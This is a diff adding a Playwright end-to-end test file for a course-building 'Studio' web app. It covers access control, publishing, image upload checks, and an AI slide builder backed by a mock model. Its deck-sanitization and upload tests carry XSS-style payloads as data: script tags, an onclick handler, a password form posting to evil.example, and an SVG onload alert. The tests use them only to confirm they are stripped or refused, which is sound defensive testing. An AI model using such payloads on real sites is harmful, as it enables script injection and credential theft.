@@ -1,0 +1,383 @@
+import http from "node:http";
+import type { AddressInfo } from "node:net";
+import { test, expect, type Browser, type Page } from "@playwright/test";
+
+import { databaseUrl, isIsolatedDb, PUBLISH_SKIP_REASON, signInAs, teacherGrants } from "./support/session";
+import { TEACHER_TERMS_VERSION } from "../../src/content/teacher-terms";
+
+/* The Studio, end to end: a teacher builds a course on the site, and the rest
+ * of the app treats it like any other class.
+ *
+ * Everything here writes rows (courses, lessons, grants), and publishing a
+ * course makes it reachable by link — so the whole file runs only against an
+ * isolated database, like the other publishing tests. */
+
+const ADMIN = { email: "e2e-admin@example.test", name: "E2E Admin" };
+const ORIGIN = `http://localhost:${process.env.PORT || "3000"}`;
+
+test.skip(!isIsolatedDb(), PUBLISH_SKIP_REASON);
+
+async function as(browser: Browser, who: { email: string; name: string }) {
+  const context = await browser.newContext();
+  const session = await signInAs(context, who);
+  const page = await context.newPage();
+  page.on("dialog", (d) => d.accept(d.type() === "prompt" ? "E2E note" : undefined));
+  return {
+    page,
+    session,
+    async close() {
+      await session.dispose();
+      await context.close();
+    },
+  };
+}
+
+async function db() {
+  const { PrismaClient } = await import("@prisma/client");
+  return new PrismaClient({ datasourceUrl: databaseUrl() });
+}
+
+/** A teacher with the live role, and every studio course they make deleted
+ * afterwards (the course outlives the user: ownerId is SetNull). */
+async function teacher(browser: Browser, tag: string) {
+  const email = `e2e-studio-${tag}-${process.pid}@example.test`;
+  const grants = await teacherGrants();
+  await grants.activate(email, TEACHER_TERMS_VERSION);
+  const t = await as(browser, { email, name: `E2E Studio ${tag}` });
+  return {
+    ...t,
+    email,
+    async close() {
+      const prisma = await db();
+      await prisma.class.deleteMany({ where: { source: "studio", teacherEmails: { has: email } } });
+      await prisma.$disconnect();
+      await t.close();
+      await grants.dispose();
+    },
+  };
+}
+
+async function createCourse(page: Page, title: string): Promise<string> {
+  await page.goto("/studio");
+  await page.getByTestId("new-course").locator('input[name="title"]').fill(title);
+  await page.getByRole("button", { name: "Create course" }).click();
+  await page.waitForURL(/\/studio\/[a-z0-9-]+$/);
+  return new URL(page.url()).pathname.split("/").pop()!;
+}
+
+test("studio: only active teachers get in", async ({ browser }) => {
+  const visitor = await as(browser, { email: `e2e-studio-visitor-${process.pid}@example.test`, name: "Visitor" });
+  try {
+    await visitor.page.goto("/studio");
+    await expect(visitor.page).toHaveURL(/\/teach$/);
+    const res = await visitor.page.request.post("/api/studio/courses", {
+      data: { title: "Sneaky" },
+      headers: { origin: ORIGIN },
+    });
+    expect(res.status()).toBe(403);
+  } finally {
+    await visitor.close();
+  }
+});
+
+test("studio: a course is built, published unlisted, and works like any class", async ({ browser }) => {
+  const t = await teacher(browser, "course");
+  const student = await as(browser, { email: `e2e-studio-student-${process.pid}@example.test`, name: "Student" });
+  const admin = await as(browser, ADMIN);
+  try {
+    const slug = await createCourse(t.page, "E2E Linear Algebra");
+    expect(slug).toMatch(/^e2e-linear-algebra-[a-z0-9]{5}$/);
+
+    // Born a draft, with one lesson: the student cannot see it yet.
+    await expect(t.page.getByTestId("lesson-list").locator("li")).toHaveCount(1);
+    expect((await student.page.goto(`/classes/${slug}`))?.status()).toBe(404);
+
+    // A second lesson, then reorder it to the front.
+    await t.page.getByLabel("New lesson title").fill("Vectors");
+    await t.page.getByRole("button", { name: "Add lesson" }).click();
+    await expect(t.page.getByTestId("lesson-list").locator("li")).toHaveCount(2);
+    await t.page.getByTestId("lesson-list").locator("li").nth(1).getByLabel("Move up").click();
+    await expect(t.page.getByTestId("lesson-list").locator("li").first()).toContainText("Vectors");
+
+    // Pick tasks: one in class, a whole topic as homework.
+    await t.page.getByTestId("lesson-list").locator("li").first().getByRole("link").click();
+    await t.page.getByLabel("Find a task").fill("fizz");
+    await t.page.getByTestId("result-py_basics/fizz_buzz").getByRole("button", { name: "+ in class" }).click();
+    await t.page.getByLabel("Find a task").fill("py_strings/*");
+    await t.page.locator(".studio-result").first().getByRole("button", { name: "+ homework" }).click();
+    await t.page.locator('input[name="homework-due"]').fill("2026-12-01");
+    await t.page.getByTestId("save-items").click();
+    await expect(t.page.getByTestId("items-part").getByText("Saved.")).toBeVisible();
+    const lessonSlug = new URL(t.page.url()).pathname.split("/").pop()!;
+    expect(lessonSlug).toMatch(/^l02-vectors$/);
+
+    // An unknown task is refused by the route, not stored.
+    const bad = await t.page.request.patch(`/api/studio/courses/${slug}/lessons/${lessonSlug}`, {
+      data: { practice: [{ type: "problem", id: "py_basics/no_such_task" }] },
+      headers: { origin: ORIGIN },
+    });
+    expect(bad.status()).toBe(400);
+
+    // Publish: reachable by link, but not listed on /classes.
+    await t.page.goto(`/studio/${slug}`);
+    await t.page.getByTestId("publish-toggle").click();
+    await expect(t.page.getByTestId("publish-toggle")).toHaveText("Unpublish");
+    expect((await student.page.goto(`/classes/${slug}`))?.status()).toBe(200);
+    await expect(student.page.getByRole("heading", { name: "E2E Linear Algebra" })).toBeVisible();
+    await student.page.goto("/classes");
+    await expect(student.page.getByText("E2E Linear Algebra")).toHaveCount(0);
+
+    // The lesson page shows the picked task and the expanded topic.
+    await student.page.goto(`/classes/${slug}/lessons/${lessonSlug}`);
+    await expect(student.page.getByRole("link", { name: /py_basics\/fizz_buzz/ })).toBeVisible();
+    await expect(student.page.locator(".ref-group summary code")).toHaveText("py_strings/*");
+
+    // A site admin lists it; now /classes shows it.
+    await admin.page.goto(`/classes/${slug}`);
+    await admin.page.getByTestId("feature-toggle").click();
+    await expect(admin.page.getByTestId("feature-toggle")).toHaveText("Unlist from /classes");
+    await student.page.goto("/classes");
+    await expect(student.page.getByText("E2E Linear Algebra")).toBeVisible();
+
+    // Another teacher's course is not editable — 404, not 403, so it does not
+    // even confirm the slug.
+    const other = await teacher(browser, "other");
+    try {
+      expect((await other.page.goto(`/studio/${slug}`))?.status()).toBe(404);
+      const res = await other.page.request.patch(`/api/studio/courses/${slug}`, {
+        data: { title: "Hijacked" },
+        headers: { origin: ORIGIN },
+      });
+      expect(res.status()).toBe(404);
+    } finally {
+      await other.close();
+    }
+  } finally {
+    await student.close();
+    await admin.close();
+    await t.close();
+  }
+});
+
+test("studio: slides are sanitized, served under a CSP, and present like a repo deck", async ({ browser }) => {
+  const t = await teacher(browser, "deck");
+  try {
+    const slug = await createCourse(t.page, "E2E Deck");
+    const lessonSlug = "l01-intro";
+    await t.page.goto(`/studio/${slug}/${lessonSlug}`);
+
+    const deck =
+      `<section><h2>Gradient descent</h2><p>Step: $w \\leftarrow w - \\eta \\nabla L$</p>` +
+      `<script>window.__pwned = 1</script><img src="https://tracker.example/p.gif" alt="t">` +
+      `<form action="https://evil.example"><input name="password"></form></section>` +
+      `<section><h3>Second</h3><p onclick="window.__pwned = 2">click</p></section>`;
+    const save = await t.page.request.patch(`/api/studio/courses/${slug}/lessons/${lessonSlug}`, {
+      data: { deck },
+      headers: { origin: ORIGIN },
+    });
+    expect(save.status()).toBe(200);
+    const saved = await save.json();
+    expect(saved.stripped).toBe(true);
+    for (const gone of ["<script", "tracker.example", "<form", "<input", "onclick"]) {
+      expect(saved.deck).not.toContain(gone);
+    }
+
+    // The page itself: CSP with a nonce, the slides, reveal running, nothing executed.
+    const res = await t.page.goto(`/classes/${slug}/${lessonSlug}/present.html`);
+    expect(res?.status()).toBe(200);
+    const csp = res!.headers()["content-security-policy"];
+    expect(csp).toMatch(/script-src 'self' 'nonce-[^']+'/);
+    expect(csp).toContain("form-action 'none'");
+    await t.page.waitForFunction(() => (window as any).Reveal?.isReady?.());
+    await expect(t.page.locator(".reveal .slides > section")).toHaveCount(2);
+    await expect(t.page.locator(".reveal .slides > section").first().locator(".katex")).toHaveCount(1);
+    expect(await t.page.evaluate(() => (window as any).__pwned)).toBeUndefined();
+
+    // A draft deck is the teacher's alone.
+    const anon = await browser.newContext();
+    const anonPage = await anon.newPage();
+    expect((await anonPage.goto(`${ORIGIN}/classes/${slug}/${lessonSlug}/present.html`))?.status()).toBe(404);
+    await anon.close();
+
+    // Images: uploaded, sniffed, served same-origin.
+    await t.page.goto(`/studio/${slug}/${lessonSlug}`);
+    const png = Buffer.from(
+      "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
+      "base64",
+    );
+    await t.page.getByTestId("image-input").setInputFiles({ name: "dot.png", mimeType: "image/png", buffer: png });
+    await expect(t.page.getByTestId("deck-msg")).toContainText("Image uploaded");
+    const editorText = await t.page.locator(".cm-content").innerText();
+    const assetUrl = /\/api\/studio\/assets\/[a-z0-9]+/.exec(editorText)?.[0];
+    expect(assetUrl).toBeTruthy();
+    const img = await t.page.request.get(assetUrl!);
+    expect(img.headers()["content-type"]).toBe("image/png");
+
+    // A text file pretending to be an image is refused by its bytes.
+    const fake = await t.page.request.post(`/api/studio/courses/${slug}/assets`, {
+      multipart: { file: { name: "x.png", mimeType: "image/png", buffer: Buffer.from("<svg onload=alert(1)>") } },
+      headers: { origin: ORIGIN },
+    });
+    expect(fake.status()).toBe(415);
+  } finally {
+    await t.close();
+  }
+});
+
+// The CSP must not break present mode itself: the ink layer, KaTeX, the theme
+// fonts and "Finish lesson" (html2canvas + jsPDF + the bridge iframe) all run
+// under it on a studio deck, with not one violation reported.
+test("studio: present mode and Finish lesson work under the deck's CSP", async ({ browser }) => {
+  test.slow();
+  const t = await teacher(browser, "present");
+  try {
+    const slug = await createCourse(t.page, "E2E Present");
+    const violations: string[] = [];
+    t.page.on("console", (m) => {
+      if (/Content Security Policy|Refused to/i.test(m.text())) violations.push(m.text());
+    });
+
+    await t.page.goto(`/classes/${slug}/l01-intro/present.html?session=smoke-test`);
+    await t.page.waitForFunction(() => (window as any).Reveal?.isReady?.());
+    const slides = await t.page.evaluate(() => (window as any).Reveal.getSlides().length);
+    expect(slides).toBe(2); // the starter deck
+
+    await t.page.keyboard.press("d");
+    const box = (await t.page.locator("canvas.ink-canvas").boundingBox())!;
+    await t.page.mouse.move(box.x + box.width * 0.4, box.y + box.height * 0.5);
+    await t.page.mouse.down();
+    await t.page.mouse.move(box.x + box.width * 0.6, box.y + box.height * 0.6);
+    await t.page.mouse.up();
+
+    const downloadPromise = t.page.waitForEvent("download", { timeout: 120_000 });
+    await t.page.getByRole("button", { name: "Finish lesson" }).click();
+    const download = await downloadPromise;
+    expect(download.suggestedFilename()).toMatch(new RegExp(`^${slug}-l01-intro-\\d{4}-\\d{2}-\\d{2}\\.pdf$`));
+    const { readFileSync } = await import("node:fs");
+    const bytes = readFileSync((await download.path())!);
+    expect(bytes.subarray(0, 5).toString()).toBe("%PDF-");
+    expect(Number(/\/Count (\d+)/.exec(bytes.toString("latin1"))?.[1])).toBe(slides);
+    // The bridge iframe ran (and was refused for want of a store) under frame-src 'self'.
+    await expect(t.page.locator("#ink-progress")).toContainText(/Not published:/);
+
+    expect(violations).toEqual([]);
+  } finally {
+    await t.close();
+  }
+});
+
+test("studio: the AI builder uses the teacher's own key and its answer is sanitized", async ({ browser }) => {
+  test.skip(process.env.AI_ALLOW_PRIVATE_BASE_URL !== "1", "needs AI_ALLOW_PRIVATE_BASE_URL=1 on the server for the mock model");
+  const requests: { model: string; messages: { role: string; content: string }[] }[] = [];
+  const mock = http.createServer((req, res) => {
+    let body = "";
+    req.on("data", (c) => (body += c));
+    req.on("end", () => {
+      requests.push(JSON.parse(body));
+      res.writeHead(200, { "Content-Type": "application/json" });
+      res.end(
+        JSON.stringify({
+          choices: [
+            {
+              message: {
+                content:
+                  "Here you go:\n```html\n<section><h2>Mock slide one</h2><script>alert(1)</script></section>\n" +
+                  "<section><h2>Mock slide two</h2></section>\n```",
+              },
+            },
+          ],
+        }),
+      );
+    });
+  });
+  await new Promise<void>((r) => mock.listen(0, "127.0.0.1", r));
+  const port = (mock.address() as AddressInfo).port;
+
+  const t = await teacher(browser, "ai");
+  try {
+    const slug = await createCourse(t.page, "E2E AI");
+
+    // No platform model in this environment and no own key yet: a clear refusal.
+    const none = await t.page.request.post("/api/studio/ai", {
+      data: { course: slug, lesson: "l01-intro", mode: "generate", prompt: "Intro to vectors" },
+      headers: { origin: ORIGIN },
+    });
+    if (!process.env.GEMINI_API_KEY && !process.env.OPENROUTER_API_KEY) expect(none.status()).toBe(501);
+
+    await t.page.goto("/studio/settings");
+    await t.page.locator('select[name="provider"]').selectOption("custom");
+    await t.page.locator('input[name="baseUrl"]').fill(`http://127.0.0.1:${port}/v1`);
+    await t.page.locator('input[name="model"]').fill("mock-model");
+    await t.page.locator('input[name="key"]').fill("sk-e2e-secret-1234");
+    await t.page.getByRole("button", { name: "Save key" }).click();
+    await expect(t.page.getByTestId("ai-key-status")).toContainText("mock-model");
+    await expect(t.page.getByTestId("ai-key-status")).toContainText("…1234");
+
+    // The key is stored encrypted, never in the clear.
+    const prisma = await db();
+    const cred = await prisma.aiCredential.findFirstOrThrow({ where: { user: { email: t.email } } });
+    expect(cred.keyCipher).not.toContain("sk-e2e-secret");
+    await prisma.$disconnect();
+
+    await t.page.goto(`/studio/${slug}/l01-intro`);
+    await t.page.getByTestId("ai-open").click();
+    await t.page.getByLabel("AI request").fill("Vectors: definition, addition, dot product");
+    await t.page.getByTestId("ai-run").click();
+    await expect(t.page.getByTestId("ai-msg")).toContainText("your key");
+    const text = await t.page.locator(".cm-content").innerText();
+    expect(text).toContain("Mock slide one");
+    expect(text).toContain("Mock slide two");
+    expect(text).not.toContain("<script");
+    expect(text).not.toContain("Here you go");
+
+    // The model got our dialect instructions and the teacher's request.
+    expect(requests.at(-1)?.model).toBe("mock-model");
+    expect(requests.at(-1)?.messages[0].content).toContain("<section>");
+    expect(requests.at(-1)?.messages[1].content).toContain("dot product");
+
+    // Not saved until the teacher saves.
+    await t.page.getByTestId("save-deck").click();
+    await expect(t.page.getByTestId("save-deck")).toHaveText("Saved");
+  } finally {
+    await t.close();
+    mock.close();
+  }
+});
+
+test("studio: a task proposal is checked in the browser and reaches the admin", async ({ browser }) => {
+  test.setTimeout(240_000);
+  const t = await teacher(browser, "proposal");
+  const admin = await as(browser, ADMIN);
+  const slug = `e2e_running_sum_${process.pid}`;
+  try {
+    await t.page.goto("/studio/proposals");
+    const form = t.page.getByTestId("proposal-form");
+    await form.locator('input[name="title"]').fill("Running total");
+    await form.locator('input[name="topic"]').fill("py_basics");
+    await form.locator('input[name="slug"]').fill(slug);
+    await form.locator('textarea[name="statement"]').fill("Return the sum of `xs` without using `sum`.");
+    // Sending is locked until the check has passed.
+    await expect(t.page.getByTestId("proposal-send")).toBeDisabled();
+    await t.page.getByTestId("proposal-check").click();
+    await expect(t.page.getByTestId("proposal-check-result")).toContainText("Reference: 6/6 tests pass", {
+      timeout: 180_000,
+    });
+    await expect(t.page.getByTestId("proposal-check-result")).toContainText("fails, as it should");
+    await t.page.getByTestId("proposal-send").click();
+    await expect(t.page.getByTestId("my-proposals")).toContainText("pending");
+
+    await admin.page.goto("/admin/proposals");
+    const card = admin.page.getByTestId(`proposal-${slug}`);
+    await expect(card).toContainText("reference 6/6, stub fails");
+    await card.getByTestId("accept").click();
+    await expect(card).toHaveCount(0);
+    await t.page.reload();
+    await expect(t.page.getByTestId("my-proposals")).toContainText("accepted");
+  } finally {
+    const prisma = await db();
+    await prisma.problemProposal.deleteMany({ where: { slug } });
+    await prisma.$disconnect();
+    await admin.close();
+    await t.close();
+  }
+});
